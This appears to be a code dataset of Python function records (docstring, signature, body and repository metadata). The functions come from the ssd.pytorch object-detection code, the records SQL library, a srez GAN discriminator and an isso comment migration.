{"docstring": "# Fully convolutional model\n", "func_signal": "def _discriminator_model(sess, features, disc_input):\n", "code": "mapsize = 3\nlayers  = [64, 128, 256, 512]\n\nold_vars = tf.all_variables()\n\nmodel = Model('DIS', 2*disc_input - 1)\n\nfor layer in range(len(layers)):\n    nunits = layers[layer]\n    stddev_factor = 2.0\n\n    model.add_conv2d(nunits, mapsize=mapsize, stride=2, stddev_factor=stddev_factor)\n    model.add_batch_norm()\n    model.add_relu()\n\n# Finalization a la \"all convolutional net\"\nmodel.add_conv2d(nunits, mapsize=mapsize, stride=1, stddev_factor=stddev_factor)\nmodel.add_batch_norm()\nmodel.add_relu()\n\nmodel.add_conv2d(nunits, mapsize=1, stride=1, stddev_factor=stddev_factor)\nmodel.add_batch_norm()\nmodel.add_relu()\n\n# Linearly map to real/fake and return average score\n# (softmax will be applied later)\nmodel.add_conv2d(1, mapsize=1, stride=1, stddev_factor=stddev_factor)\nmodel.add_mean()\n\nnew_vars  = tf.all_variables()\ndisc_vars = list(set(new_vars) - set(old_vars))\n\nreturn model.get_output(), disc_vars", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "'''Returns the original annotation of image at index\n\nNote: not using self.__getitem__(), as any transformations passed in\ncould mess up this functionality.\n\nArgument:\n    index (int): index of img to get annotation of\nReturn:\n    list:  [img_id, [(label, bbox coords),...]]\n        eg: ('001718', [('dog', (96, 13, 438, 332))])\n'''\n", "func_signal": "def pull_anno(self, index):\n", "code": "img_id = self.ids[index]\nanno = ET.parse(self._annopath % img_id).getroot()\ngt = self.target_transform(anno, 1, 1)\nreturn img_id[1], gt", "path": "ssd.pytorch/data/voc0712.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"Custom collate fn for dealing with batches of images that have a different\nnumber of associated object annotations (bounding boxes).\n\nArguments:\n    batch: (tuple) A tuple of tensor images and lists of annotations\n\nReturn:\n    A tuple containing:\n        1) (tensor) batch of images stacked on their 0 dim\n        2) (list of tensors) annotations for a given image are stacked on\n                             0 dim\n\"\"\"\n", "func_signal": "def detection_collate(batch):\n", "code": "targets = []\nimgs = []\nfor sample in batch:\n    imgs.append(sample[0])\n    targets.append(torch.FloatTensor(sample[1]))\nreturn torch.stack(imgs, 0), targets", "path": "ssd.pytorch/data/__init__.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"\nArgs:\n    index (int): Index\nReturns:\n    tuple: Tuple (image, target).\n           target is the object returned by ``coco.loadAnns``.\n\"\"\"\n", "func_signal": "def __getitem__(self, index):\n", "code": "im, gt, h, w = self.pull_item(index)\nreturn im, gt", "path": "ssd.pytorch/data/coco.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "# dump predictions and assoc. ground truth to text file for now\n", "func_signal": "def test_net(save_folder, net, cuda, testset, transform, thresh):\n", "code": "filename = save_folder+'test1.txt'\nnum_images = len(testset)\nfor i in range(num_images):\n    print('Testing image {:d}/{:d}....'.format(i+1, num_images))\n    img = testset.pull_image(i)\n    img_id, annotation = testset.pull_anno(i)\n    x = torch.from_numpy(transform(img)[0]).permute(2, 0, 1)\n    x = Variable(x.unsqueeze(0))\n\n    with open(filename, mode='a') as f:\n        f.write('\\nGROUND TRUTH FOR: '+img_id+'\\n')\n        for box in annotation:\n            f.write('label: '+' || '.join(str(b) for b in box)+'\\n')\n    if cuda:\n        x = x.cuda()\n\n    y = net(x)      # forward pass\n    detections = y.data\n    # scale each detection back up to the image\n    scale = torch.Tensor([img.shape[1], img.shape[0],\n                         img.shape[1], img.shape[0]])\n    pred_num = 0\n    for i in range(detections.size(1)):\n        j = 0\n        while detections[0, i, j, 0] >= 0.6:\n            if pred_num == 0:\n                with open(filename, mode='a') as f:\n                    f.write('PREDICTIONS: '+'\\n')\n            score = detections[0, i, j, 0]\n            label_name = labelmap[i-1]\n            pt = (detections[0, i, j, 1:]*scale).cpu().numpy()\n            coords = (pt[0], pt[1], pt[2], pt[3])\n            pred_num += 1\n            with open(filename, mode='a') as f:\n                f.write(str(pred_num)+' label: '+label_name+' score: ' +\n                        str(score) + ' '+' || '.join(str(c) for c in coords) + '\\n')\n            j += 1", "path": "ssd.pytorch/test.py", "commit_date": "2018-03-06 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"\nArgs:\n    index (int): Index\nReturns:\n    tuple: Tuple (image, target, height, width).\n           target is the object returned by ``coco.loadAnns``.\n\"\"\"\n", "func_signal": "def pull_item(self, index):\n", "code": "img_id = self.ids[index]\ntarget = self.coco.imgToAnns[img_id]\nann_ids = self.coco.getAnnIds(imgIds=img_id)\n\ntarget = self.coco.loadAnns(ann_ids)\npath = osp.join(self.root, self.coco.loadImgs(img_id)[0]['file_name'])\nassert osp.exists(path), 'Image path does not exist: {}'.format(path)\nimg = cv2.imread(osp.join(self.root, path))\nheight, width, _ = img.shape\nif self.target_transform is not None:\n    target = self.target_transform(target, width, height)\nif self.transform is not None:\n    target = np.array(target)\n    img, boxes, labels = self.transform(img, target[:, :4],\n                                        target[:, 4])\n    # to rgb\n    img = img[:, :, (2, 1, 0)]\n\n    target = np.hstack((boxes, np.expand_dims(labels, axis=1)))\nreturn torch.from_numpy(img).permute(2, 0, 1), target, height, width", "path": "ssd.pytorch/data/coco.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"Applies network layers and ops on input image(s) x.\n\nArgs:\n    x: input image or batch of images. Shape: [batch,3,300,300].\n\nReturn:\n    Depending on phase:\n    test:\n        Variable(tensor) of output class label predictions,\n        confidence score, and corresponding location predictions for\n        each object detected. Shape: [batch,topk,7]\n\n    train:\n        list of concat outputs from:\n            1: confidence layers, Shape: [batch*num_priors,num_classes]\n            2: localization layers, Shape: [batch,num_priors*4]\n            3: priorbox layers, Shape: [2,num_priors*4]\n\"\"\"\n", "func_signal": "def forward(self, x):\n", "code": "sources = list()\nloc = list()\nconf = list()\n\n# apply vgg up to conv4_3 relu\nfor k in range(23):\n    x = self.vgg[k](x)\n\ns = self.L2Norm(x)\nsources.append(s)\n\n# apply vgg up to fc7\nfor k in range(23, len(self.vgg)):\n    x = self.vgg[k](x)\nsources.append(x)\n\n# apply extra layers and cache source layer outputs\nfor k, v in enumerate(self.extras):\n    x = F.relu(v(x), inplace=True)\n    if k % 2 == 1:\n        sources.append(x)\n\n# apply multibox head to source layers\nfor (x, l, c) in zip(sources, self.loc, self.conf):\n    loc.append(l(x).permute(0, 2, 3, 1).contiguous())\n    conf.append(c(x).permute(0, 2, 3, 1).contiguous())\n\nloc = torch.cat([o.view(o.size(0), -1) for o in loc], 1)\nconf = torch.cat([o.view(o.size(0), -1) for o in conf], 1)\nif self.phase == \"test\":\n    output = self.detect(\n        loc.view(loc.size(0), -1, 4),                   # loc preds\n        self.softmax(conf.view(conf.size(0), -1,\n                     self.num_classes)),                # conf preds\n        self.priors.type(type(x.data))                  # default boxes\n    )\nelse:\n    output = (\n        loc.view(loc.size(0), -1, 4),\n        conf.view(conf.size(0), -1, self.num_classes),\n        self.priors\n    )\nreturn output", "path": "ssd.pytorch/ssd.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"\nArgs:\n    target (dict): COCO target json annotation as a python dict\n    height (int): height\n    width (int): width\nReturns:\n    a list containing lists of bounding boxes  [bbox coords, class idx]\n\"\"\"\n", "func_signal": "def __call__(self, target, width, height):\n", "code": "scale = np.array([width, height, width, height])\nres = []\nfor obj in target:\n    if 'bbox' in obj:\n        bbox = obj['bbox']\n        bbox[2] += bbox[0]\n        bbox[3] += bbox[1]\n        label_idx = self.label_map[obj['category_id']] - 1\n        final_box = list(np.array(bbox)/scale)\n        final_box.append(label_idx)\n        res += [final_box]  # [xmin, ymin, xmax, ymax, label_idx]\n    else:\n        print(\"no bbox problem!\")\n\nreturn res  # [[xmin, ymin, xmax, ymax, label_idx], ... ]", "path": "ssd.pytorch/data/coco.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "# Extra layers added to VGG for feature scaling\n", "func_signal": "def add_extras(cfg, i, batch_norm=False):\n", "code": "layers = []\nin_channels = i\nflag = False\nfor k, v in enumerate(cfg):\n    if in_channels != 'S':\n        if v == 'S':\n            layers += [nn.Conv2d(in_channels, cfg[k + 1],\n                       kernel_size=(1, 3)[flag], stride=2, padding=1)]\n        else:\n            layers += [nn.Conv2d(in_channels, v, kernel_size=(1, 3)[flag])]\n        flag = not flag\n    in_channels = v\nreturn layers", "path": "ssd.pytorch/ssd.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "# load net\n", "func_signal": "def test_voc():\n", "code": "num_classes = len(VOC_CLASSES) + 1 # +1 background\nnet = build_ssd('test', 300, num_classes) # initialize SSD\nnet.load_state_dict(torch.load(args.trained_model))\nnet.eval()\nprint('Finished loading model!')\n# load data\ntestset = VOCDetection(args.voc_root, [('2007', 'test')], None, VOCAnnotationTransform())\nif args.cuda:\n    net = net.cuda()\n    cudnn.benchmark = True\n# evaluation\ntest_net(args.save_folder, net, args.cuda, testset,\n         BaseTransform(net.size, (104, 117, 123)),\n         thresh=args.visual_threshold)", "path": "ssd.pytorch/test.py", "commit_date": "2018-03-06 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "'''Returns the original image object at index in PIL form\n\nNote: not using self.__getitem__(), as any transformations passed in\ncould mess up this functionality.\n\nArgument:\n    index (int): index of img to show\nReturn:\n    PIL img\n'''\n", "func_signal": "def pull_image(self, index):\n", "code": "img_id = self.ids[index]\nreturn cv2.imread(self._imgpath % img_id, cv2.IMREAD_COLOR)", "path": "ssd.pytorch/data/voc0712.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "'''Returns the original annotation of image at index\n\nNote: not using self.__getitem__(), as any transformations passed in\ncould mess up this functionality.\n\nArgument:\n    index (int): index of img to get annotation of\nReturn:\n    list:  [img_id, [(label, bbox coords),...]]\n        eg: ('001718', [('dog', (96, 13, 438, 332))])\n'''\n", "func_signal": "def pull_anno(self, index):\n", "code": "img_id = self.ids[index]\nann_ids = self.coco.getAnnIds(imgIds=img_id)\nreturn self.coco.loadAnns(ann_ids)", "path": "ssd.pytorch/data/coco.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "# VOCdevkit/VOC2007/results/det_test_aeroplane.txt\n", "func_signal": "def get_voc_results_file_template(image_set, cls):\n", "code": "filename = 'det_' + image_set + '_%s.txt' % (cls)\nfiledir = os.path.join(devkit_path, 'results')\nif not os.path.exists(filedir):\n    os.makedirs(filedir)\npath = os.path.join(filedir, filename)\nreturn path", "path": "ssd.pytorch/eval.py", "commit_date": "2019-03-11 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"Return the directory where experimental artifacts are placed.\nIf the directory does not exist, it is created.\nA canonical path is built using the name from an imdb and a network\n(if not None).\n\"\"\"\n", "func_signal": "def get_output_dir(name, phase):\n", "code": "filedir = os.path.join(name, phase)\nif not os.path.exists(filedir):\n    os.makedirs(filedir)\nreturn filedir", "path": "ssd.pytorch/eval.py", "commit_date": "2019-03-11 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"\nArgs:\n    loc_data: (tensor) Loc preds from loc layers\n        Shape: [batch,num_priors*4]\n    conf_data: (tensor) Shape: Conf preds from conf layers\n        Shape: [batch*num_priors,num_classes]\n    prior_data: (tensor) Prior boxes and variances from priorbox layers\n        Shape: [1,num_priors,4]\n\"\"\"\n", "func_signal": "def forward(self, loc_data, conf_data, prior_data):\n", "code": "num = loc_data.size(0)  # batch size\nnum_priors = prior_data.size(0)\noutput = torch.zeros(num, self.num_classes, self.top_k, 5)\nconf_preds = conf_data.view(num, num_priors,\n                            self.num_classes).transpose(2, 1)\n\n# Decode predictions into bboxes.\nfor i in range(num):\n    decoded_boxes = decode(loc_data[i], prior_data, self.variance)\n    # For each class, perform nms\n    conf_scores = conf_preds[i].clone()\n\n    for cl in range(1, self.num_classes):\n        c_mask = conf_scores[cl].gt(self.conf_thresh)\n        scores = conf_scores[cl][c_mask]\n        if scores.size(0) == 0:\n            continue\n        l_mask = c_mask.unsqueeze(1).expand_as(decoded_boxes)\n        boxes = decoded_boxes[l_mask].view(-1, 4)\n        # idx of highest scoring and non-overlapping boxes per class\n        ids, count = nms(boxes, scores, self.nms_thresh, self.top_k)\n        output[i, cl, :count] = \\\n            torch.cat((scores[ids[:count]].unsqueeze(1),\n                       boxes[ids[:count]]), 1)\nflt = output.contiguous().view(num, -1, 5)\n_, idx = flt[:, :, 0].sort(1, descending=True)\n_, rank = idx.sort(1)\nflt[(rank < self.top_k).unsqueeze(-1).expand_as(flt)].fill_(0)\nreturn output", "path": "ssd.pytorch/layers/functions/detection.py", "commit_date": "2019-03-11 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"Compute the jaccard overlap of two sets of boxes.  The jaccard overlap\nis simply the intersection over union of two boxes.\nE.g.:\n    A \u2229 B / A \u222a B = A \u2229 B / (area(A) + area(B) - A \u2229 B)\nArgs:\n    box_a: Multiple bounding boxes, Shape: [num_boxes,4]\n    box_b: Single bounding box, Shape: [4]\nReturn:\n    jaccard overlap: Shape: [box_a.shape[0], box_a.shape[1]]\n\"\"\"\n", "func_signal": "def jaccard_numpy(box_a, box_b):\n", "code": "inter = intersect(box_a, box_b)\narea_a = ((box_a[:, 2]-box_a[:, 0]) *\n          (box_a[:, 3]-box_a[:, 1]))  # [A,B]\narea_b = ((box_b[2]-box_b[0]) *\n          (box_b[3]-box_b[1]))  # [A,B]\nunion = area_a + area_b - inter\nreturn inter / union  # [A,B]", "path": "ssd.pytorch/utils/augmentations.py", "commit_date": "2017-06-18 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "'''Returns the original image object at index in PIL form\n\nNote: not using self.__getitem__(), as any transformations passed in\ncould mess up this functionality.\n\nArgument:\n    index (int): index of img to show\nReturn:\n    cv2 img\n'''\n", "func_signal": "def pull_image(self, index):\n", "code": "img_id = self.ids[index]\npath = self.coco.loadImgs(img_id)[0]['file_name']\nreturn cv2.imread(osp.join(self.root, path), cv2.IMREAD_COLOR)", "path": "ssd.pytorch/data/coco.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"\nArgs:\n    image (Tensor): image tensor to be transformed\nReturn:\n    a tensor with channels swapped according to swap\n\"\"\"\n# if torch.is_tensor(image):\n#     image = image.data.cpu().numpy()\n# else:\n#     image = np.array(image)\n", "func_signal": "def __call__(self, image):\n", "code": "image = image[:, :, self.swaps]\nreturn image", "path": "ssd.pytorch/utils/augmentations.py", "commit_date": "2017-06-18 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\" ap = voc_ap(rec, prec, [use_07_metric])\nCompute VOC AP given precision and recall.\nIf use_07_metric is true, uses the\nVOC 07 11 point method (default:True).\n\"\"\"\n", "func_signal": "def voc_ap(rec, prec, use_07_metric=True):\n", "code": "if use_07_metric:\n    # 11 point metric\n    ap = 0.\n    for t in np.arange(0., 1.1, 0.1):\n        if np.sum(rec >= t) == 0:\n            p = 0\n        else:\n            p = np.max(prec[rec >= t])\n        ap = ap + p / 11.\nelse:\n    # correct AP calculation\n    # first append sentinel values at the end\n    mrec = np.concatenate(([0.], rec, [1.]))\n    mpre = np.concatenate(([0.], prec, [0.]))\n\n    # compute the precision envelope\n    for i in range(mpre.size - 1, 0, -1):\n        mpre[i - 1] = np.maximum(mpre[i - 1], mpre[i])\n\n    # to calculate area under PR curve, look for points\n    # where X axis (recall) changes value\n    i = np.where(mrec[1:] != mrec[:-1])[0]\n\n    # and sum (\\Delta recall) * prec\n    ap = np.sum((mrec[i + 1] - mrec[i]) * mpre[i + 1])\nreturn ap", "path": "ssd.pytorch/eval.py", "commit_date": "2019-03-11 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"\nArguments:\n    target (annotation) : the target annotation to be made usable\n        will be an ET.Element\nReturns:\n    a list containing lists of bounding boxes  [bbox coords, class name]\n\"\"\"\n", "func_signal": "def __call__(self, target, width, height):\n", "code": "res = []\nfor obj in target.iter('object'):\n    difficult = int(obj.find('difficult').text) == 1\n    if not self.keep_difficult and difficult:\n        continue\n    name = obj.find('name').text.lower().strip()\n    bbox = obj.find('bndbox')\n\n    pts = ['xmin', 'ymin', 'xmax', 'ymax']\n    bndbox = []\n    for i, pt in enumerate(pts):\n        cur_pt = int(bbox.find(pt).text) - 1\n        # scale height or width\n        cur_pt = cur_pt / width if i % 2 == 0 else cur_pt / height\n        bndbox.append(cur_pt)\n    label_idx = self.class_to_ind[name]\n    bndbox.append(label_idx)\n    res += [bndbox]  # [xmin, ymin, xmax, ymax, label_ind]\n    # img_id = target.find('filename').text[:-4]\n\nreturn res  # [[xmin, ymin, xmax, ymax, label_ind], ... ]", "path": "ssd.pytorch/data/voc0712.py", "commit_date": "2018-03-30 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\" Parse a PASCAL VOC xml file \"\"\"\n", "func_signal": "def parse_rec(filename):\n", "code": "tree = ET.parse(filename)\nobjects = []\nfor obj in tree.findall('object'):\n    obj_struct = {}\n    obj_struct['name'] = obj.find('name').text\n    obj_struct['pose'] = obj.find('pose').text\n    obj_struct['truncated'] = int(obj.find('truncated').text)\n    obj_struct['difficult'] = int(obj.find('difficult').text)\n    bbox = obj.find('bndbox')\n    obj_struct['bbox'] = [int(bbox.find('xmin').text) - 1,\n                          int(bbox.find('ymin').text) - 1,\n                          int(bbox.find('xmax').text) - 1,\n                          int(bbox.find('ymax').text) - 1]\n    objects.append(obj_struct)\n\nreturn objects", "path": "ssd.pytorch/eval.py", "commit_date": "2019-03-11 00:00:00", "repo_name": "amdegroot/ssd.pytorch", "stars": 5015, "license": "mit", "language": "python", "size": 108865}
{"docstring": "\"\"\"Returns a list of all rows for the RecordCollection. If they haven't\nbeen fetched yet, consume the iterator and cache the results.\"\"\"\n\n# By calling list it calls the __iter__ method\n", "func_signal": "def all(self, as_dict=False, as_ordereddict=False):\n", "code": "rows = list(self)\n\nif as_dict:\n    return [r.as_dict() for r in rows]\nelif as_ordereddict:\n    return [r.as_dict(ordered=True) for r in rows]\n\nreturn rows", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Get a connection to this Database. Connections are retrieved from a\npool.\n\"\"\"\n", "func_signal": "def get_connection(self):\n", "code": "if not self.open:\n    raise exc.ResourceClosedError('Database closed.')\n\nreturn Connection(self._engine.connect())", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"A Tablib Dataset representation of the RecordCollection.\"\"\"\n# Create a new Tablib Dataset.\n", "func_signal": "def dataset(self):\n", "code": "data = tablib.Dataset()\n\n# If the RecordCollection is empty, just return the empty set\n# Check number of rows by typecasting to list\nif len(list(self)) == 0:\n    return data\n\n# Set the column names as headers on Tablib Dataset.\nfirst = self[0]\n\ndata.headers = first.keys()\nfor row in self.all():\n    row = _reduce_datetimes(row.values())\n    data.append(row)\n\nreturn data", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Database with table `foo` created\n\ntear_down drops the table.\n\nTypically applied by `@pytest.mark.usefixtures('foo_table')`\n\"\"\"\n", "func_signal": "def foo_table(db):\n", "code": "db.query('CREATE TABLE foo (a integer)')\nyield\ndb.query('DROP TABLE foo')", "path": "records/tests/conftest.py", "commit_date": "2018-04-26 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Returns a single record for the RecordCollection, ensuring that it\nis the only record, or returns `default`. If `default` is an instance\nor subclass of Exception, then raise it instead of returning it.\"\"\"\n\n# Ensure that we don't have more than one row.\n", "func_signal": "def one(self, default=None, as_dict=False, as_ordereddict=False):\n", "code": "try:\n    self[1]\nexcept IndexError:\n    return self.first(default=default, as_dict=as_dict, as_ordereddict=as_ordereddict)\nelse:\n    raise ValueError('RecordCollection contained more than one row. '\n                     'Expects only one row when using '\n                     'RecordCollection.one')", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "# If no db_url was provided, fallback to $DATABASE_URL.\n", "func_signal": "def __init__(self, db_url=None, **kwargs):\n", "code": "self.db_url = db_url or os.environ.get('DATABASE_URL')\n\nif not self.db_url:\n    raise ValueError('You must provide a db_url.')\n\n# Create an engine.\nself._engine = create_engine(self.db_url, **kwargs)\nself.open = True", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Receives a row, converts datetimes to strings.\"\"\"\n\n", "func_signal": "def _reduce_datetimes(row):\n", "code": "row = list(row)\n\nfor i in range(len(row)):\n    if hasattr(row[i], 'isoformat'):\n        row[i] = row[i].isoformat()\nreturn tuple(row)", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Returns the row as a dictionary, as ordered.\"\"\"\n", "func_signal": "def as_dict(self, ordered=False):\n", "code": "items = zip(self.keys(), self.values())\n\nreturn OrderedDict(items) if ordered else dict(items)", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Like Database.bulk_query, but takes a filename to load a query from.\"\"\"\n\n", "func_signal": "def bulk_query_file(self, path, *multiparams):\n", "code": "with self.get_connection() as conn:\n    conn.bulk_query_file(path, *multiparams)", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Returns a single record for the RecordCollection, or `default`. If\n`default` is an instance or subclass of Exception, then raise it\ninstead of returning it.\"\"\"\n\n# Try to get a record, or return/raise default.\n", "func_signal": "def first(self, default=None, as_dict=False, as_ordereddict=False):\n", "code": "try:\n    record = self[0]\nexcept IndexError:\n    if isexception(default):\n        raise default\n    return default\n\n# Cast and return.\nif as_dict:\n    return record.as_dict()\nelif as_ordereddict:\n    return record.as_dict(ordered=True)\nelse:\n    return record", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Closes the Database.\"\"\"\n", "func_signal": "def close(self):\n", "code": "self._engine.dispose()\nself.open = False", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Returns the first column of the first row, or `default`.\"\"\"\n", "func_signal": "def scalar(self, default=None):\n", "code": "row = self.one()\nreturn row[0] if row else default", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Like Database.query, but takes a filename to load a query from.\"\"\"\n\n", "func_signal": "def query_file(self, path, fetchall=False, **params):\n", "code": "with self.get_connection() as conn:\n    return conn.query_file(path, fetchall, **params)", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"A Tablib Dataset containing the row.\"\"\"\n", "func_signal": "def dataset(self):\n", "code": "data = tablib.Dataset()\ndata.headers = self.keys()\n\nrow = _reduce_datetimes(self.values())\ndata.append(row)\n\nreturn data", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Given an object, return a boolean indicating whether it is an instance\nor subclass of :py:class:`Exception`.\n\"\"\"\n", "func_signal": "def isexception(obj):\n", "code": "if isinstance(obj, Exception):\n    return True\nif isclass(obj) and issubclass(obj, Exception):\n    return True\nreturn False", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "# Support for index-based lookup.\n", "func_signal": "def __getitem__(self, key):\n", "code": "if isinstance(key, int):\n    return self.values()[key]\n\n# Support for string-based lookup.\nif key in self.keys():\n    i = self.keys().index(key)\n    if self.keys().count(key) > 1:\n        raise KeyError(\"Record contains multiple '{}' fields.\".format(key))\n    return self.values()[i]\n\nraise KeyError(\"Record contains no '{}' field.\".format(key))", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Like Connection.bulk_query, but takes a filename to load a query\nfrom.\n\"\"\"\n\n # If path doesn't exists\n", "func_signal": "def bulk_query_file(self, path, *multiparams):\n", "code": "if not os.path.exists(path):\n    raise IOError(\"File '{}'' not found!\".format(path))\n\n# If it's a directory\nif os.path.isdir(path):\n    raise IOError(\"'{}' is a directory!\".format(path))\n\n# Read the given .sql file into memory.\nwith open(path) as f:\n    query = f.read()\n\nself._conn.execute(text(query), *multiparams)", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Instance of `records.Database(dburl)`\n\nEnsure, it gets closed after being used in a test or fixture.\n\nParametrized with (sql_url_id, sql_url_template) tuple.\nIf `sql_url_template` contains `{dbfile}` it is replaced with path to a\ntemporary file.\n\nFeel free to parametrize for other databases and experiment with them.\n\"\"\"\n", "func_signal": "def db(request, tmpdir):\n", "code": "id, url = request.param\n# replace {dbfile} in url with temporary db file path\nurl = url.format(dbfile=str(tmpdir / \"db.sqlite\"))\ndb = records.Database(url)\nyield db  # providing fixture value for a test case\n# tear_down\ndb.close()", "path": "records/tests/conftest.py", "commit_date": "2018-04-26 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Iterate over all rows, consuming the underlying generator\nonly when necessary.\"\"\"\n", "func_signal": "def __iter__(self):\n", "code": "i = 0\nwhile True:\n    # Other code may have iterated between yields,\n    # so always check the cache.\n    if i < len(self):\n        yield self[i]\n    else:\n        # Throws StopIteration when done.\n        # Prevent StopIteration bubbling from generator, following https://www.python.org/dev/peps/pep-0479/\n        try:\n            yield next(self)\n        except StopIteration:\n            return\n    i += 1", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"A context manager for executing a transaction on this Database.\"\"\"\n\n", "func_signal": "def transaction(self):\n", "code": "conn = self.get_connection()\ntx = conn.transaction()\ntry:\n    yield conn\n    tx.commit()\nexcept:\n    tx.rollback()\nfinally:\n    conn.close()", "path": "records/records.py", "commit_date": "2019-05-23 00:00:00", "repo_name": "kennethreitz/records", "stars": 7061, "license": "isc", "language": "python", "size": 203}
{"docstring": "\"\"\"Process a thread and insert its comments in the DB.\"\"\"\n", "func_signal": "def insert(self, thread):\n", "code": "thread_id = thread['id']\ntitle = thread['title']\nself.db.threads.new(thread_id, title)\n\ncomments = list(map(self._build_comment, thread['comments']))\ncomments.sort(key=lambda comment: comment['id'])\nself.count += len(comments)\nfor comment in comments:\n    self.db.comments.add(thread_id, comment)", "path": "isso/isso/migrate.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "isso-comments/isso", "stars": 4945, "license": "mit", "language": "python", "size": 3687}
